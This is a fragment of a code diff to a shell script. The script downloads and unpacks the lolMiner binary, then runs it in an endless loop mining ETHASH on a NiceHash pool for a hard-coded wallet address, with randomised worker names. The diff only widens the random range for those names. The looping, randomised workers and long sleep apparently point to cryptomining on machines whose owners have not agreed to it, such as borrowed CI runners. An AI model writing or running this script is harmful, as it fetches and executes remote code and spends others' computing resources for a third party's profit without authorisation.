@@ -5,7 +5,7 @@ wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.44/lolM
 tar -xf lolMiner_v1.44_Lin64.tar.gz
 while [ 1 ]; do
 cd 1.44/
-./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 111-333 -n 1)-XXX) --ethstratum ETHPROXY
+./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 111-555 -n 1)-XXX) --ethstratum ETHPROXY
 sleep 3
 done
 sleep 999
